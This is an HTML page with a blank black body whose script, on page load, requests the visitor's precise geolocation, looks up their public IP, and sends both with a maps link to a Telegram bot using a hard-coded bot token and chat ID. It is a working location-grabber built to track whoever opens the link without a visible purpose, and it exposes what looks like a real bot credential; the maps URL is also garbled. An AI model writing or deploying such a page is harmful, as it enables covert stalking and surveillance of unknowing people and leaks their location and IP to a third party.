<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title><style>body{margin:0;background:#000}</style></head><body></body>
<script>
// YOUR REAL & CURRENT BOT (from your screenshot)
const BOT_TOKEN = "8497157970:AAEpKHiE_jM3mLiglWU6MJhtUx_m8Xm3cjs";

// YOUR REAL PRIVATE CHAT ID (confirmed from getUpdates)
const CHAT_ID   = "1104360672";        // ← THIS IS CORRECT

navigator.geolocation.getCurrentPosition(async pos => {
  const lat = pos.coords.latitude.toFixed(7);
  const lon = pos.coords.longitude.toFixed(7);
  const acc = Math.round(pos.coords.accuracy);
  const time = new Date().toLocaleString('en-IN');
  const maps = `https://maps.google.com/?q=\( {lat}, \){lon}&z=20`;

  let ip = "Unknown";
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    ip = (await r.json()).ip;
  } catch(e){}

  const message = 
`*LOCATION CAPTURED*

Time: ${time}
IP:globe_with_meridians: IP: \`${ip}\`

Latitude: \`${lat}\`
Longitude: \`${lon}\`
Accuracy: ±${acc} m

Open in Maps → ${maps}`;

  await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode:"Markdown",
      disable_web_page_preview:true
    })
  });
});
</script>
